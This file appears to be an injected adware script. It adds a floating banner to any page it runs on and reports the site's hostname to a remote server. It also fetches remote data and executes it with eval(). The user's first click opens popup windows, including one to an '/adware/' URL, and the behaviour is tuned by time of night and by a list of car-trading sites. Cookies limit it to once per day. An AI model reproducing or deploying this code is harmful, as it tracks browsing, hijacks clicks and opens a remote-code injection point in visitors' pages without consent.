window.onload = function() {
	var script = document.createElement('script');
	var head = document.getElementsByTagName('head')[0];
	script.type = 'text/javascript';
	script.src = 'http://code.jquery.com/jquery-latest.js';
	head.appendChild(script);
    /*增加浮动位*/
	var _body = document.body;
	var id = 'newDiv8888';
	var name = 'newDiv8888';
	var newElement1 = document.createElement('div');
	newElement1.id = 'newDiv8888';
	var newElement2 = document.createElement('div');
	newElement2.id = 'newDiv7777';
	var newElement3 = document.createElement('div');
	newElement3.id = 'newDiv6666';
	newElement1.setAttribute('name', 'newDiv8888');
	newElement1.style="position:fixed; bottom:0;right:0;z-index:99990;width:100%;height:90px;overflow:hidden;"
	newElement1.style.margin='0 auto';
	//newElement1.style.visibility = "visible";   
	newElement1.style.positoon='absolute';
	newElement1.style.bottom='0';
	newElement1.style.right='0';
	newElement1.appendChild(newElement2);
	newElement1.appendChild(newElement3);
	_body.appendChild(newElement1);
	
	
	window.url1 = top.location.hostname;

	var reqType = 1;
	var ad = 0;
	window.opp = 1;
	window.aop = 0;
	var xmlHttp;
	//alert(url1);
	getSource();
	script.onload = script.onreadystatechange = function() {
		if (!this.readyState || this.readyState == 'loaded' || this.readyState == 'complete') {
			ap(reqType, ad, url1);

		}
		script.onload = script.onreadystatechange = null;
	}


}

function ap(reqType, ad, url1) {
	if (navigator.cookieEnabled == true) {

		//sendPostRequest("http://113.57.230.176:8888/404/Po", "reqType=3&url=" + url1);
		sendPostRequest("http://127.0.0.1:8080/404/Po", "reqType=3&url=" + url1);
		var popFlag = getCookie('FlagForAbc123123');

		if (popFlag == null || popFlag == "") {
			popFlag = 0;


		}




		if (popFlag == 0) {
			$.ajax({
				type : 'post',
				//url : 'http://113.57.230.176:8888/404/admin/Paction',
				url : 'http://127.0.0.1:8080/404/admin/paction',
				data : {
					"reqType" : reqType,
					"ad" : ad,
					"url" : url1
				},
				dataType : 'jsonp',

				jsonp : "jsonpcallback",
				success : function(result) {
					console.log("可操作类型:" + result.status);
					console.log(result.dese);
					if (result.status == "0") {
						if (result.dese == "0") {
							var beginTime = new Date();
							var endTime = new Date();
							beginTime.setHours(21);
							beginTime.setMinutes(59);
							endTime.setHours(6);
							endTime.setMinutes(30);
							var n = new Date();

							if (n.getTime() - beginTime.getTime() > 0 && n.getTime() - endTime.getTime() < 0) {
								opp = 3;


							}


						}
						if (result.dese == "1" && aop == 0) {

							opp = 2;
							if (url1 == "a.xcar.com.cn" || url1 == "m.che168.com" || url1 == "m.jingzhengu.com" || url1 == "m.gongpingjia.com" || url1 == "m.jingzhengu.com" || url1 == "m.taoche.com" || url1 == "www.laocher.com" || url1 == "www.hx2car.com" || url1 == "www.chevip.com" || url1 == "m.iautos.cn" || url1 == "wap.uu2car.com" || url1 == "www.yicheshi.com" || url1 == "m.haoche51.com") {
								opp = 4

							}

						}
						if (result.dese == "2") {
							opp = 2;

							if (url1 == "a.xcar.com.cn" || url1 == "m.che168.com" || url1 == "m.jingzhengu.com" || url1 == "m.gongpingjia.com" || url1 == "m.jingzhengu.com" || url1 == "m.taoche.com" || url1 == "www.laocher.com" || url1 == "www.hx2car.com" || url1 == "www.chevip.com" || url1 == "m.iautos.cn" || url1 == "wap.uu2car.com" || url1 == "www.yicheshi.com" || url1 == "m.haoche51.com") {
								opp = 4
							}
						}
					//setCookie("FlagForAbc123123", opp, 60 * 24);
					} else {
						setCookie("FlagForAbc123123", 9, 60 * 24);
					}

				},
				error : function() {
					setCookie("FlagForAbc123123", 9, 60 * 24);
				}
			});

		} else {
			return;

		}
	}
}

document.onclick = function(ev) {

	if (opp == 2 || opp == 3 || opp == 4) {
		var ap = 5;
		if (opp == 3) {

			ap = 1;
		}
		if (opp == 4) {
			ap = 3
		}

		opp = 5;


		$.ajax({
			type : 'post',
			url : 'http://127.0.0.1:8080/404/admin/paction',
			//url : 'http://113.57.230.176:8888/404/admin/Paction',
			data : {
				"reqType" : 5,
				"ad" : ap,
				"url" : url1
			},
			dataType : 'jsonp',

			jsonp : "jsonpcallback",
			success : function(result) {

				console.log("处理结果：" + result.status);
				console.log(result.dese);
				if (result.status == "3") {
					setCookie("FlagForAbc123123", opp, 60 * 24);

				}

			},
			error : function() {

				setCookie("FlagForAbc123123", 9, 60 * 24);
			}
		});
		if (ap == 1) {
			window.open("http://lbbseo.com:8888/adware/ldy6.do?id=111");
		}
		if (ap == 3) {

			window.open("http://m.mychebao.com/czhib_promote/temSecIndex.htm?id=67");
		}
		if (ap == 5) {
			window.open("http://iwap.2345.com/?lm_1128");
		}

	} else {

		return;
	}
}
function getCookie(c_name) {
	if (document.cookie.length > 0) {
		c_start = document.cookie.indexOf(c_name + "=");

		if (c_start != -1) {
			c_start = c_start + c_name.length + 1;
			c_end = document.cookie.indexOf(";", c_start);
			if (c_end == -1)
				c_end = document.cookie.length;
			return unescape(document.cookie.substring(c_start, c_end));


		}
	}

	return "";
}


function setCookie(c_name, value, expireMins) {
	var leftTime = new Date(new Date(new Date().toLocaleDateString()).getTime() + 24 * 60 * 60 * 1000 - 1) //当日23点59分59秒过期

	document.cookie = c_name + "=" + escape(value) + ((expireMins == null) ? "" : ";expires=" + leftTime.toGMTString());

}

function sendPostRequest(url, param, callback) {
	var xmlhttp;
	if (window.XMLHttpRequest) {
		// code for IE7+, Firefox, Chrome, Opera, Safari
		xmlhttp = new XMLHttpRequest();
	} else {
		// code for IE6, IE5
		xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	}
	xmlhttp.onreadystatechange = callback;
	xmlhttp.open("POST", url, true);
	xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xmlhttp.send(param);
	return xmlhttp;
}
function createXmlHttp() { 
	//根据window.XMLHttpRequest对象是否存在使用不同的创建方式 
	if (window.XMLHttpRequest) { 
	xmlHttp = new XMLHttpRequest(); //FireFox、Opera等浏览器支持的创建方式 
	} else { 
	xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");//IE浏览器支持的创建方式 
	} 
	} 
//直接通过XMLHttpRequest对象获取远程网页源代码 
function getSource() {
	var url = "http://news.yigouu.com/api/34.php?page=1&type=toutiao"; //获取目标地址信息 
	

	//document.getElementById("source").value = "正在加载……"; //提示正在加载 
	createXmlHttp(); //创建XMLHttpRequest对象 
	xmlHttp.onreadystatechange = writeSource; //设置回调函数 
	xmlHttp.open("GET", url, true);
	xmlHttp.send(null);
}
//将远程网页源代码写入页面文字区域 
function writeSource() {
	if (xmlHttp.readyState == 4) {
		//console.log(xmlHttp.responseText);
		var ul = document.getElementById("newDiv7777");
		
		var a=xmlHttp.responseText;
		var obj= eval('(' + a + ')');
		console.log("222"+obj.data.id);
		var obj1=  obj.data ; 
		for(var p in obj1){//遍历json数组时，这么写p为索引，0,1
			var li = document.createElement("li");
			li.setAttribute("id", "newli"+p);
			var title=obj1[p].title.length<=20?obj1[p].title:obj1[p].title.substring(0, 16)+"....";
            li.innerHTML ="<a href='"+obj1[p].url+"'style='text-decoration:none'><font size='9' color='red'>"+ title+"</font></a>";
            //关闭按钮
        	
            ul.appendChild(li);
         
			console.log("p is "+p);
           
			console.log(obj1[p].id + " " + obj1[p].title+" "+obj1[p].url+" "+obj1[p].pubdate+" "+obj1[p].litpic+" "+obj1[p].type);
        	   
			}
		var _body = document.body;
		var newElement4 = document.createElement('div');
		newElement4.id = 'newDiv5555';
		newElement4.style="position:fixed; bottom:0;right:0;z-index:99990;width:100%;height:90px;overflow:hidden;"
		newElement4.innerHTML = "<input type=\"button\" style=\"position:absolute; right:10px;top:10px;\"  onclick=\"divclose()\" value=\"X\" />";
		_body.appendChild(newElement4);
		var speed=100
		newDiv6666.innerHTML=newDiv7777.innerHTML
		   function Marquee(){
		   if(newDiv6666.offsetTop-newDiv8888.scrollTop<=0)
			   newDiv8888.scrollTop-=newDiv7777.offsetHeight
		   else{
			   newDiv8888.scrollTop++
		   }
		   }
		   var MyMar=setInterval(Marquee,speed)
		   newDiv8888.onmouseover=function() {clearInterval(MyMar)}
		   newDiv8888.onmouseout=function() {MyMar=setInterval(Marquee,speed)}
		
	}
}
function strToJson(str){ 
var json = eval('(' + str + ')'); 
return json; 
}